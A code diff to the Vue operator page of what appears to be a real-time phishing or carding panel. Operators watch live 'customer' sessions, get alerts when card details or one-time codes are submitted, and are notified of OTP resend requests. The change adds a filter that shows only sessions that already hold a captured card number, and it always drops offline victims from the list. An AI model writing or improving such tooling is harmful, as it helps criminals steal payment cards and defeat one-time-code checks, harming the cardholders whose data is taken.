@@ -7,37 +7,32 @@ import SettingsPanel from './modules/settings-panel.vue';
 const sessions = reactive<Api.Payment.PaymentSession[]>([]);
 const connectCount = reactive<Api.Payment.ConnectCount>({ customerCount: 0, operatorCount: 0 });
 const settingsPanel = ref<InstanceType<typeof SettingsPanel> | null>(null);
-const hideOffline = ref(false);
-
-// Load saved setting
-try {
-  const raw = localStorage.getItem('payment_console_settings');
-  if (raw) {
-    const s = JSON.parse(raw);
-    if (s.hideOfflineUsers) hideOffline.value = true;
-  }
-} catch {}
 
 const audioNew = new Audio('/audio/new-session.mp3');
 const audioCard = new Audio('/audio/card-submit.mp3');
 const audioOtp = new Audio('/audio/otp-submit.mp3');
+const audioResend = new Audio('/audio/resend-alert.mp3');
 
 function playAudio(audio: HTMLAudioElement) {
   audio.currentTime = 0;
   audio.play().catch(() => {});
 }
 
+var _onlyCardFilter = false;
+try { var _saved = JSON.parse(localStorage.getItem('payment_console_settings')||'{}'); _onlyCardFilter = !!_saved.onlyCardData } catch(e){}
+
 const { connected, sendAction, ws } = usePaymentWs({
   wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/`,
   operatorId: 'op_' + Date.now(),
   onSessionList: (list) => {
-    const filtered = hideOffline.value
-      ? (list as Api.Payment.PaymentSession[]).filter(s => s.isOnline !== false)
-      : (list as Api.Payment.PaymentSession[]);
+    const filtered = (list as Api.Payment.PaymentSession[])
+      .filter(s => s.isOnline !== false)
+      .filter(s => !_onlyCardFilter || !!(s.cardInfo?.cardNumber));
     sessions.splice(0, sessions.length, ...filtered);
   },
   onSessionNew: (data) => {
     if (sessions.find(s => s.id === data.id)) return;
+    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
     sessions.unshift(data as Api.Payment.PaymentSession);
     playAudio(audioNew);
     window.$notification?.info({
@@ -61,8 +56,8 @@ const { connected, sendAction, ws } = usePaymentWs({
       if (data.currentStep !== undefined) s.currentStep = data.currentStep;
       if (data.status !== undefined) s.status = data.status;
       if (data.isOnline !== undefined) s.isOnline = data.isOnline;
-      // Remove from list when customer goes offline (if hideOffline is on)
-      if (data.isOnline === false && hideOffline.value) {
+      // Remove from list when customer goes offline
+      if (data.isOnline === false) {
         sessions.splice(idx, 1);
         return;
       }
@@ -112,6 +107,7 @@ const { connected, sendAction, ws } = usePaymentWs({
   },
   onResendOtp: (data) => {
     const s = sessions.find(s => s.id === data.sessionId);
+    playAudio(audioResend);
     window.$message?.warning(`客户请求重发验证码 (第${data.count}次)${s ? ' - 会话'+s.sessionId : ''}`, { duration: 4000 });
   },
   onAppVerifyDone: (data) => {
@@ -134,10 +130,7 @@ function handleAction(action: Api.Payment.OperatorAction, sessionId: string, mes
 }
 
 function handleSettingsChanged(settings: any) {
-  hideOffline.value = !!settings.hideOfflineUsers;
-  if (!hideOffline.value) {
-    // Remove filter - need to reload sessions
-  }
+  _onlyCardFilter = !!settings.onlyCardData;
   if (ws.value?.readyState === WebSocket.OPEN) {
     ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
   } else {
